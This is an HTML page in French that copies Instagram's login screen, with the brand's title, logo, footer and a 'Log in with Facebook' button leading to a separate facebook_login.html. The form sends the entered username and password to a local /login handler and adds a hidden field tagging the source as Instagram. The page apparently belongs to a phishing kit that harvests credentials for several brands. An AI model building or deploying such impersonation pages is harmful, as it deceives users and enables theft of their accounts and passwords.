<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-box">
        <img src="logo_instagram.png" alt="Instagram Logo" class="insta-logo">
        <form id="loginForm" action="/login" method="POST">
            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <input type="hidden" name="source" value="Instagram">
            <button type="submit">Connexion</button>
            
            <div class="separator">ou</div>

            <button onclick="window.location.href='facebook_login.html'" class="facebook-login-btn">
                Se connecter avec Facebook
            </button>
        </form>
        <div class="login-options">
            <a href="#">Mot de passe oublié ?</a>
        </div>
    </div>

    <!-- Texte en bas de page -->
    <footer class="footer-text">
        Instagram © 2024
    </footer>
</body>
</html>
